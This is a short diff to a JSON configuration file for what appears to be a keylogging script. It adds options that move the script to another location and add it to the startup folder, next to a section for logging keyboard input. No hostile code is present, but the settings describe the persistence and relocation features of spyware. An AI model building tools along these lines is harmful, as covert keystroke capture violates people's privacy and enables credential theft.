@@ -1,6 +1,10 @@
 {
+    //Move the script to another location and run it from there. Leave blank to disable.
+    "move_location": "",
     //Either absolute or relative folder path name for the logs. Please use forward slashes "/". Leave "." for current directory.
     "logs_location": "logs",
+    //Whether to create a shortcut to the script in the startup folder (if it doesn't already exist), so that it will run on startup.
+    "create_startup_shortcut": false,
 
     //Logs keyboard input.
     "keylogger": {
